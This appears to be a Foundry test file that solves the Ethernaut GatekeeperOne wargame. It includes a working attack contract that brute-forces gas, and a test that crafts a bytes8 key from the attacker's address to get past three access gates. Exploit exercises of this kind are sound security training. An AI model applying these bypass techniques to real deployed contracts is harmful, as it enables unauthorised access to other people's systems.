// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";

/// @dev Must call enter() via a contract (gateOne: msg.sender != tx.origin).
///      Also need a valid bytes8 key (gateThree) and the right gas (gateTwo).
contract AttackGatekeeperOne {
    GatekeeperOne public immutable target;

    constructor(GatekeeperOne _target) {
        target = _target;
    }

    /// @dev Call enter with a key. Use {gas: ...} or try many gas values for gateTwo.
    function attack(bytes8 _gateKey) external {
        // ========== YOUR ATTACK LOGIC HERE ==========
        // Hints:
        //   1. Call from this contract so gateOne passes (msg.sender != tx.origin)
        //   2. gateTwo: gasleft() % 8191 == 0 when the modifier runs
        //      → try different gas stipends, e.g. in a loop:
        //        for (uint256 i = 0; i < 8191; i++) {
        //            (bool ok,) = address(target).call{gas: 8191 * 3 + i}(
        //                abi.encodeWithSignature("enter(bytes8)", _gateKey)
        //            );
        //            if (ok) break;
        //        }
        //   3. Or call once with a known-good gas if you figure it out:
        //        target.enter{gas: SOME_AMOUNT}(_gateKey);
        // ========== END ATTACK LOGIC ==========
        for (uint256 i = 0; i < 8191; i++) {
            (bool ok,) = address(target).call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (ok) break;
        }
    }

    // Optional helper: build a key that satisfies gateThree for a given origin.
    // function makeKey(address origin) public pure returns (bytes8) { ... }
}

contract GatekeeperOneTest is Test {
    GatekeeperOne public target;
    AttackGatekeeperOne public attackContract;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(deployer);
        target = new GatekeeperOne();
        vm.stopPrank();

        vm.startPrank(attacker);
        attackContract = new AttackGatekeeperOne(target);
        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition (Ethernaut):
        //   target.entrant() == attacker  (tx.origin of the successful enter)
        //
        // Three gates:
        //
        // gateOne:
        //   require(msg.sender != tx.origin)
        //   → call enter() through AttackGatekeeperOne, not as an EOA
        //
        // gateTwo:
        //   require(gasleft() % 8191 == 0)
        //   → gas remaining at that require must be divisible by 8191
        //   → brute-force gas in Foundry (cheap to try many values)
        //
        // gateThree (bytes8 key as uint64):
        //   uint32(key) == uint16(key)           // high 16 bits of low 32 are zero
        //   uint32(key) != uint64(key)           // high 32 bits of key are non-zero
        //   uint32(key) == uint16(uint160(tx.origin))  // low 16 bits match tx.origin
        //
        // Tip for key (tx.origin == attacker):
        //   Take last 2 bytes of attacker address, mask/pad to satisfy the above.
        //   Example shape often used: 0x000000010000XXXX where XXXX = uint16(uint160(attacker))
        //
        // Tip:
        //   bytes8 key = ...;  // craft from attacker
        //   attackContract.attack(key);

        vm.startPrank(attacker, attacker);

        // ========== YOUR EXPLOIT HERE ==========
        // bytes8 key = ...;
        // attackContract.attack(key);
        // ========== END EXPLOIT ==========
        uint160 attackerNum160 = uint160(attacker);
        uint16 attackerNum16 = uint16(attackerNum160);
        uint64 keyNum64 = uint64(attackerNum16);
        keyNum64 |= (uint64(1) << 32);
        attackContract.attack(bytes8(keyNum64));
        vm.stopPrank();

        assertEq(target.entrant(), attacker, "attacker should be entrant");
    }
}
